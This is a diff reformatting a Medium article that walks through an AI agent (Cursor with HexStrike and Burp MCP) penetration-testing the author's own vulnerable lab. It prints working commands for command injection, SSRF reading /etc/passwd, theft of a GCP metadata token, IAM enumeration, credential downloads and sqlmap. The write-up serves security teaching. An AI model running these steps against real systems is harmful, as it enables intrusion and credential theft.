@@ -13,11 +13,11 @@ A Complete Guide to Modern AI-Powered Security Testing. From One Prompt to Full 
 
 #### A Complete Guide to Modern AI-Powered Security Testing. From One Prompt to Full Attack Surface Coverage (Recon → Exploit → Report).
 
-![](https://cdn-images-1.medium.com/max/800/1*A1OtUodkuog3T-EllA0oRw.png)
+![](/img/hexstrike-articles/ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp/1-A1OtUodkuog3T-EllA0oRw.png)
 
 * * *
 
-#### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD)
+#### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](<https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD>)
 
 * * *
 
@@ -42,7 +42,7 @@ A Complete Guide to Modern AI-Powered Security Testing. From One Prompt to Full 
 **Manual guide for this lab environment here**
 
 [**A Complete Cloud Penetration Testing Walkthrough**  
- _How I Discovered Critical Vulnerabilities in a Cloud Environment Using Basic Tools and Methodical Testing_ medium.com](https://medium.com/@1200km/a-complete-cloud-penetration-testing-walkthrough-1914f687d7fd "https://medium.com/@1200km/a-complete-cloud-penetration-testing-walkthrough-1914f687d7fd")[](https://medium.com/@1200km/a-complete-cloud-penetration-testing-walkthrough-1914f687d7fd)
+ _How I Discovered Critical Vulnerabilities in a Cloud Environment Using Basic Tools and Methodical Testing_ medium.com](<https://medium.com/@1200km/a-complete-cloud-penetration-testing-walkthrough-1914f687d7fd> "https://medium.com/@1200km/a-complete-cloud-penetration-testing-walkthrough-1914f687d7fd")[](<https://medium.com/@1200km/a-complete-cloud-penetration-testing-walkthrough-1914f687d7fd>)
 
 ### Introduction
 
@@ -92,10 +92,11 @@ Model Context Protocol is a standardized way for AI assistants to interact with 
 ### HexStrike MCP Configuration
 
 [**HexStrike AI: Install, Configure, and Run MCP with Gemini, OpenAI, Cursor, Llama**  
- _A practical, end-to-end guide to installing HexStrike AI, wiring it as an MCP server, and running real tool-driven…_ medium.com](https://medium.com/ai-security-hub/hexstrike-on-kali-linux-2025-4-a-comprehensive-guide-85a0e5752949 "https://medium.com/ai-security-hub/hexstrike-on-kali-linux-2025-4-a-comprehensive-guide-85a0e5752949")[](https://medium.com/ai-security-hub/hexstrike-on-kali-linux-2025-4-a-comprehensive-guide-85a0e5752949)
+ _A practical, end-to-end guide to installing HexStrike AI, wiring it as an MCP server, and running real tool-driven…_ medium.com](<https://medium.com/ai-security-hub/hexstrike-on-kali-linux-2025-4-a-comprehensive-guide-85a0e5752949> "https://medium.com/ai-security-hub/hexstrike-on-kali-linux-2025-4-a-comprehensive-guide-85a0e5752949")[](<https://medium.com/ai-security-hub/hexstrike-on-kali-linux-2025-4-a-comprehensive-guide-85a0e5752949>)
 
 **Location:** `/home/andrey/.cursor/mcp.json`
-[code]
+    
+    
     {  
     "mcpServers": {  
     "hexstrike-ai": {  
@@ -111,7 +112,6 @@ Model Context Protocol is a standardized way for AI assistants to interact with 
     }  
     }  
     }
-[/code]
 
 **Key Features:**
 
@@ -125,8 +125,9 @@ Model Context Protocol is a standardized way for AI assistants to interact with 
 ### Burp Suite MCP Configuration
 
 [**Burp Suite MCP + Gemini CLI**  
- _Connect Burp Suite to Gemini CLI using Model Context Protocol (MCP) and Turn Burp into an AI-callable toolset and…_ medium.com](https://medium.com/ai-security-hub/burp-suite-mcp-gemini-cli-c1229edfe092 "https://medium.com/ai-security-hub/burp-suite-mcp-gemini-cli-c1229edfe092")[](https://medium.com/ai-security-hub/burp-suite-mcp-gemini-cli-c1229edfe092)
-[code]
+ _Connect Burp Suite to Gemini CLI using Model Context Protocol (MCP) and Turn Burp into an AI-callable toolset and…_ medium.com](<https://medium.com/ai-security-hub/burp-suite-mcp-gemini-cli-c1229edfe092> "https://medium.com/ai-security-hub/burp-suite-mcp-gemini-cli-c1229edfe092")[](<https://medium.com/ai-security-hub/burp-suite-mcp-gemini-cli-c1229edfe092>)
+    
+    
     {  
     "burp": {  
     "url": "http://127.0.0.1:9876/sse",  
@@ -134,7 +135,6 @@ Model Context Protocol is a standardized way for AI assistants to interact with 
     "trust": false  
     }  
     }
-[/code]
 
 **Key Features:**
 
@@ -144,8 +144,9 @@ Model Context Protocol is a standardized way for AI assistants to interact with 
   * **History Management:** Track all HTTP interactions
   * **Repeater/Intruder:** Manual testing and fuzzing capabilities
 
-![](https://cdn-images-1.medium.com/max/800/1*urfIlqtk0dlWhvSJIY8M5w.png)![](https://cdn-images-1.medium.com/max/800/1*d4s68TfVGGopNxO19-bDEA.png)
-[code]
+![](/img/hexstrike-articles/ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp/1-urfIlqtk0dlWhvSJIY8M5w.png)![](/img/hexstrike-articles/ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp/1-d4s68TfVGGopNxO19-bDEA.png)
+    
+    
     {  
       "mcpServers": {  
         "hexstrike-ai": {  
@@ -166,10 +167,10 @@ Model Context Protocol is a standardized way for AI assistants to interact with 
         }  
       }  
     }
-[/code]
 
 #### How MCP Integration Works
-[code]
+    
+    
     ┌─────────────┐  
     │ Cursor AI │  
     │ (Brain) │  
@@ -188,7 +189,6 @@ Model Context Protocol is a standardized way for AI assistants to interact with 
     │ 150+ Tools │ │ HTTP Proxy │  
     │ (nmap, etc)│ │ Scanner, etc │  
     └─────────────┘ └─────────────┘
-[/code]
 
 The AI (Cursor) acts as the orchestrator, making intelligent decisions about which tools to use and when, while MCP servers provide standardized access to specialized capabilities. — -
 
@@ -198,7 +198,7 @@ The AI (Cursor) acts as the orchestrator, making intelligent decisions about whi
 
 #### Step 1: Install Cursor AI
 
-  1. Download Cursor from [https://cursor.sh](https://cursor.sh/)
+  1. Download Cursor from [https://cursor.sh](<https://cursor.sh/>)
   2. Install following platform-specific instructions
   3. Launch Cursor and configure workspace
 
@@ -218,14 +218,14 @@ The AI (Cursor) acts as the orchestrator, making intelligent decisions about whi
   4. Verify connection in Cursor’s MCP status **Verification:**
 
 
-[code]
+    
+    
      # Check if HexStrike server is running  
     curl http://127.0.0.1:8889/health  
     # Test MCP connection  
     # In Cursor, check available tools via MCP
-[/code]
 
-![](https://cdn-images-1.medium.com/max/800/1*bYkl0wHKC98CjkJFp3u6_Q.png)
+![](/img/hexstrike-articles/ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp/1-bYkl0wHKC98CjkJFp3u6_Q.png)
 
 #### Step 3: Configure Burp Suite MCP
 
@@ -243,11 +243,11 @@ The AI (Cursor) acts as the orchestrator, making intelligent decisions about whi
   5. Restart Cursor **Verification:**
 
 
-[code]
+    
+    
      # Test Burp MCP endpoint  
     curl http://127.0.0.1:9876/sse  
     # In Cursor, verify Burp tools are available
-[/code]
 
 #### Step 4: Verify Integration
 
@@ -256,7 +256,7 @@ Once both MCP servers are configured, Cursor AI should have access to:
   * **From HexStrike:** 150+ security tools (nmap, sqlmap, nuclei, etc.)
   * **From Burp:** HTTP proxy, scanner, repeater, intruder capabilities You can verify by asking Cursor to list available tools or by attempting to use a tool. — -
 
-![](https://cdn-images-1.medium.com/max/800/1*swhB2jBeqw-uxeQSZkHK6A.png)
+![](/img/hexstrike-articles/ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp/1-swhB2jBeqw-uxeQSZkHK6A.png)
 
 * * *
 
@@ -266,7 +266,7 @@ Once both MCP servers are configured, Cursor AI should have access to:
 
 **User Prompt:**
 
-> “Perform a blackbox penetration test on [http://34.121.191.196](http://34.121.191.196/)"
+> “Perform a blackbox penetration test on [http://34.121.191.196](<http://34.121.191.196/>)"
 
 That’s it. One entry point. No additional information. Let’s see how the AI reasons through this challenge.
 
@@ -296,21 +296,21 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > MCP tools provide structured output and logging, but for a simple port scan, direct commands might be faster. However, using MCP maintains consistency and allows for better tool orchestration. Let me try HexStrike MCP first.”
 
 **Action:** Attempt to use HexStrike MCP
-[code]
+    
+    
     # AI attempts MCP call  
     result = mcp_hexstrike_ai_nmap_scan(  
         target="34.121.191.196",  
         scan_type="-sV",  
         ports="22,80,443,8080,8443,3306,5432"  
     )
-[/code]
 
 **Troubleshooting Scenario 1: MCP Connection Issue**
 
 **Error Received:**
-[code]
+    
+    
      Connection refused: http://127.0.0.1:8889
-[/code]
 
 **AI Reasoning:**
 
@@ -328,9 +328,9 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “HexStrike MCP is unavailable. I’ll use direct nmap command instead. This is slower but still effective.”
 
 **Action:** Execute direct command
-[code]
+    
+    
     nmap -sV -sC -p 22,80,443,8080,8443,3306,5432 34.121.191.196
-[/code]
 
 **Result:**
 
@@ -352,16 +352,16 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “I need to understand what web application is running. I’ll start with a simple HEAD request to check headers, then look at the actual page content. For this, direct curl is most efficient.”
 
 **Action:**
-[code]
+    
+    
      curl -I http://34.121.191.196/login.php
-[/code]
 
 **Result Analysis:**
-[code]
+    
+    
      Server: nginx/1.18.0  
     Set-Cookie: security=impossible  
     Set-Cookie: PHPSESSID=...
-[/code]
 
 **AI Reasoning:**
 
@@ -404,15 +404,16 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > I’ll use curl for these quick checks. No need for MCP here.”
 
 **Actions:**
-[code]
+    
+    
      curl -s http://34.121.191.196/robots.txt  
     # Result: User-agent: *\nDisallow: / (no useful info)  
     curl -s http://34.121.191.196/info.php  
     # Result: [CRITICAL FINDING - see below]
-[/code]
 
 **Critical Discovery:**
-[code]
+    
+    
      Cloud Function: https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40  
     Cloud Run: https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app  
     Storage Bucket: gs://vulnerable-bucket-39ca4c40  
@@ -421,7 +422,6 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
     - ?url= - URL fetching  
     - ?env= - Environment variables  
     - ?secret= - Secret key
-[/code]
 
 **AI Reasoning:**
 
@@ -463,9 +463,9 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > For initial testing, direct curl is fastest. I can always use Burp MCP later for deeper analysis. Let me start with simple curl tests.”
 
 **Action — Testing Command Injection:**
-[code]
+    
+    
      curl -s "https://...cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami"
-[/code]
 
 **Result:** `www-data`
 
@@ -483,9 +483,9 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > This is a game-changer. Let me test the other parameters too, then use this RCE to escalate.”
 
 **Action — Testing SSRF:**
-[code]
+    
+    
      curl -s "...?url=file:///etc/passwd"
-[/code]
 
 **Result:** Successfully read /etc/passwd
 
@@ -494,9 +494,9 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “SSRF confirmed! I can read local files via file:// protocol. This is another critical vulnerability. Now let me check the other parameters.”
 
 **Action — Testing Environment Variables:**
-[code]
+    
+    
      curl -s "...?env=1" | python3 -m json.tool
-[/code]
 
 **Result:** Full JSON of environment variables including SECRET_KEY
 
@@ -536,9 +536,9 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > I can do this via the command injection. I’ll use Python since it’s likely available in the Cloud Function environment.”
 
 **Action:**
-[code]
+    
+    
      curl "...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token');req.add_header('Metadata-Flavor','Google');token=json.loads(urllib.request.urlopen(req).read().decode());print(token['access_token'])"
-[/code]
 
 **Troubleshooting Scenario 2: URL Encoding Issues**
 
@@ -553,10 +553,10 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “Let me try a simpler approach first — just test if I can access the metadata service at all, then build up to getting the token.”
 
 **Alternative Approach:**
-[code]
+    
+    
      # Test metadata access  
     curl "...?cmd=curl+-H+Metadata-Flavor:Google+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
-[/code]
 
 **Result:** Successfully obtained access token!
 
@@ -590,15 +590,16 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > I’ll use curl with the GCP REST APIs. No need for gcloud CLI — the APIs work directly.”
 
 **Actions:**
-[code]
+    
+    
      TOKEN="<access_token>"  
     # List storage buckets  
     curl -H "Authorization: Bearer $TOKEN" \  
       "https://storage.googleapis.com/storage/v1/b?project=cloud-pentest-lab-1769759595"
-[/code]
 
 **Result:**
-[code]
+    
+    
     {  
       "items": [  
         {  
@@ -609,16 +610,15 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
         }  
       ]  
     }
-[/code]
 
 **AI Reasoning:**
 
 > “I found the bucket mentioned in info.php. The IAM configuration shows ‘publicAccessPrevention: inherited’, which might mean it’s publicly accessible. Let me test if I can access it without authentication.”
 
 **Action — Testing Public Access:**
-[code]
+    
+    
      curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/"
-[/code]
 
 **Result:** Successfully listed bucket contents!
 
@@ -627,19 +627,19 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “CRITICAL MISCONFIGURATION! The bucket is publicly accessible. I can list and download files without authentication. This is a major security issue. Let me see what’s in it.”
 
 **Action — Downloading Files:**
-[code]
+    
+    
      curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json"
-[/code]
 
 **Result:**
-[code]
+    
+    
     {  
       "api_key": "sk_live_39ca4c40",  
       "db_host": "internal-db-39ca4c40",  
       "db_password": "SuperSecret123!",  
       "db_user": "admin"  
     }
-[/code]
 
 **AI Reasoning:**
 
@@ -654,9 +654,9 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > This bucket should never have been public. Let me also check what other files are there.”
 
 **Action — Downloading Source Code:**
-[code]
+    
+    
      curl "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip" -o function-code.zip
-[/code]
 
 **Result:** Downloaded complete Cloud Function source code
 
@@ -665,13 +665,14 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “I have the source code. This confirms the vulnerabilities I found and might reveal additional issues. Let me also check service accounts to see if there are overprivileged ones.”
 
 **Action — Enumerating Service Accounts:**
-[code]
+    
+    
      curl -H "Authorization: Bearer $TOKEN" \  
       "https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts"
-[/code]
 
 **Result:**
-[code]
+    
+    
     {  
       "accounts": [  
         {  
@@ -679,17 +680,16 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
         }  
       ]  
     }
-[/code]
 
 **AI Reasoning:**
 
 > “The service account name ‘overprivileged-sa’ is a red flag. Let me check its permissions.”
 
 **Action — Checking Permissions:**
-[code]
+    
+    
      curl -H "Authorization: Bearer $TOKEN" \  
       "https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts/overprivileged-sa-39ca4c40@cloud-pentest-lab-1769759595.iam.gserviceaccount.com:getIamPolicy"
-[/code]
 
 **Result:** Service account has `roles/owner` \- full project access!
 
@@ -714,7 +714,8 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > For SQL injection, I should use HexStrike’s sqlmap tool via MCP. For HTTP analysis, Burp MCP would be ideal. Let me try both.”
 
 **Action — Attempting SQL Injection Testing:**
-[code]
+    
+    
      # AI attempts HexStrike MCP  
     result = mcp_hexstrike_ai_sqlmap_scan(  
         url="http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit",  
@@ -723,7 +724,6 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
         risk=3,  
         batch=True  
     )
-[/code]
 
 **Troubleshooting Scenario 3: SQLmap Session Issues**
 
@@ -746,7 +746,8 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “I need to establish a session first. Let me login and capture the PHPSESSID, then use it in sqlmap.”
 
 **Action:**
-[code]
+    
+    
      # Login and capture session  
     curl -c cookies.txt -d "username=admin&password=admin&Login=Login" \  
       http://34.121.191.196/login.php  
@@ -756,7 +757,6 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
     sqlmap -u "http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit" \  
       --cookie="security=low; PHPSESSID=$PHPSESSID" \  
       --batch
-[/code]
 
 **Result:** SQLmap now runs successfully (though security level ‘impossible’ may prevent exploitation)
 
@@ -765,7 +765,8 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 > “Good, sqlmap is running. While it tests, I should also use Burp Suite MCP for HTTP traffic analysis. Let me check if Burp MCP is available.”
 
 **Action — Attempting Burp MCP:**
-[code]
+    
+    
      # AI attempts Burp MCP  
     try:  
         history = mcp_burp_get_proxy_http_history()  
@@ -773,7 +774,6 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
     except Exception as e:  
         # Burp MCP not available  
         pass
-[/code]
 
 **Troubleshooting Scenario 4: Burp MCP Not Available**
 
@@ -827,7 +827,8 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
 * * *
 
 ### Full PT Report (Generated by AI)
-[code]
+    
+    
     # Full Penetration Test Report  
     ## Target: http://34.121.191.196  
       
@@ -1517,7 +1518,6 @@ That’s it. One entry point. No additional information. Let’s see how the AI 
     **Classification:** Confidential    
     **Next Assessment:** Recommended in 3 months after remediation    
     **Methodology:** AI-Assisted Penetration Testing (Cursor + HexStrike MCP + Burp Suite MCP)
-[/code]
 
 ### Tool Usage and Integration
 
@@ -1552,9 +1552,9 @@ HexStrike MCP is ideal for:
 
 
 **Example Flow:**
-[code]
+    
+    
      AI Decision → HexStrike MCP → Tool Execution → Results → AI Analysis → Next Decision
-[/code]
 
 #### When to Use Burp Suite MCP
 
@@ -1586,9 +1586,9 @@ Burp Suite MCP is ideal for:
 
 
 **Example Flow:**
-[code]
+    
+    
      Browser → Burp Proxy → Burp MCP → AI Analysis → Modified Request → Target
-[/code]
 
 #### When to Use Direct Commands
 
@@ -1620,10 +1620,10 @@ Sometimes, direct commands are more efficient:
 
 
 **Example:**
-[code]
+    
+    
      # Direct curl is faster than going through MCP for simple requests  
     curl http://target.com/endpoint
-[/code]
 
 * * *
 
@@ -1663,7 +1663,8 @@ The AI (Cursor) uses several factors to make decisions:
 **Situation:** DVWA with security level**“impossible”**
 
 **AI Reasoning:**
-[code]
+    
+    
      1. "Security level is 'impossible' - most DVWA vulnerabilities are patched"  
     2. "But info.php exposed cloud services - these might be vulnerable"  
     3. "Cloud Function has suspicious parameters (?cmd=, ?url=)"  
@@ -1673,12 +1674,12 @@ The AI (Cursor) uses several factors to make decisions:
     7. "Found public bucket - let me check what's in it"  
     8. "Database credentials exposed - this is critical"  
     9. "Let me also test with sqlmap and Burp for completeness"
-[/code]
 
 **Key Insight:** AI doesn’t give up when one path is blocked. It adapts and finds alternative attack vectors.
 
 #### Decision Tree Example
-[code]
+    
+    
     Start: Target http://34.121.191.196  
     │  
     ├─ Port Scan (HexStrike nmap)  
@@ -1714,7 +1715,6 @@ The AI (Cursor) uses several factors to make decisions:
     │  
     └─ HTTP Analysis (Burp MCP)  
        └─ Analyzed: Traffic, parameters, responses
-[/code]
 
 * * *
 
@@ -1725,9 +1725,9 @@ The AI (Cursor) uses several factors to make decisions:
 #### Issue 1: HexStrike MCP Connection Failed
 
 **Error:**
-[code]
+    
+    
      Connection refused: http://127.0.0.1:8889
-[/code]
 
 **AI Troubleshooting:**
 
@@ -1739,13 +1739,13 @@ The AI (Cursor) uses several factors to make decisions:
 
 
 **Solution:**
-[code]
+    
+    
      # Check server status  
     curl http://127.0.0.1:8889/health  
     # If not running, start it  
     cd /home/andrey/hexstrike-ai  
     python3 hexstrike_server.py --port 8889
-[/code]
 
 **AI Adaptation:**
 
@@ -1754,9 +1754,9 @@ The AI (Cursor) uses several factors to make decisions:
 #### Issue 2: Burp MCP Not Responding
 
 **Error:**
-[code]
+    
+    
      Timeout waiting for Burp MCP response
-[/code]
 
 **AI Troubleshooting:**
 
@@ -1783,9 +1783,9 @@ The AI (Cursor) uses several factors to make decisions:
 #### Issue 3: Tool Not Found in HexStrike
 
 **Error:**
-[code]
+    
+    
      Tool 'nmap_scan' not found
-[/code]
 
 **AI Troubleshooting:**
 
@@ -1797,13 +1797,13 @@ The AI (Cursor) uses several factors to make decisions:
 
 
 **Solution:**
-[code]
+    
+    
      # Check available tools  
     # In HexStrike, tools might be named differently:  
     # - nmap_scan vs nmap_advanced_scan  
     # - sqlmap_scan vs sqlmap_test  
     # AI adapts by trying alternative names or using direct commands
-[/code]
 
 **AI Adaptation:**
 
@@ -1823,11 +1823,11 @@ The AI (Cursor) uses several factors to make decisions:
 
 
 **Solution:**
-[code]
+    
+    
      sqlmap -u "http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit" \  
       --cookie="security=low; PHPSESSID=test123" \  
       --batch
-[/code]
 
 **AI Adaptation:**
 
@@ -1905,10 +1905,10 @@ The AI demonstrates several problem-solving strategies:
 
 
 **Example:**
-[code]
+    
+    
      Traditional: Run nmap → Manually analyze → Decide to run sqlmap → Manually configure → Run sqlmap  
     AI-Assisted: AI runs nmap → AI analyzes → AI decides sqlmap is needed → AI configures and runs sqlmap → AI correlates results
-[/code]
 
 #### 2\. Contextual Understanding
 
@@ -2178,7 +2178,8 @@ The future of penetration testing is AI-assisted, and MCP is the key to making i
 * * *
 
 ### Appendix B: Complete Attack Timeline
-[code]
+    
+    
     00:00 - Start: Target identified  
     00:02 - Port scan complete (nmap via HexStrike)  
     00:05 - Web app identified (DVWA)  
@@ -2196,7 +2197,6 @@ The future of penetration testing is AI-assisted, and MCP is the key to making i
     00:50 - Burp Suite analysis  
     01:00 - Report generation started  
     01:10 - All reports complete
-[/code]
 
 **Total Time:** ~70 minutes for complete penetration test and documentation
 
@@ -2204,10 +2204,10 @@ The future of penetration testing is AI-assisted, and MCP is the key to making i
 
 **Andrey Pautov**
 
-#### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD)
+#### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](<https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD>)
 
-By [Andrey Pautov](https://medium.com/@1200km) on [January 31, 2026](https://medium.com/p/01c02eed5258).
+By [Andrey Pautov](<https://medium.com/@1200km>) on [January 31, 2026](<https://medium.com/p/01c02eed5258>).
 
-[Canonical link](https://medium.com/@1200km/ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp-01c02eed5258)
+[Canonical link](<https://medium.com/@1200km/ai-assisted-web-and-cloud-penetration-testing-with-cursor-mcp-hexstrike-and-burp-suite-mcp-01c02eed5258>)
 
-Exported from [Medium](https://medium.com) on May 15, 2026.
+Exported from [Medium](<https://medium.com>) on May 15, 2026.
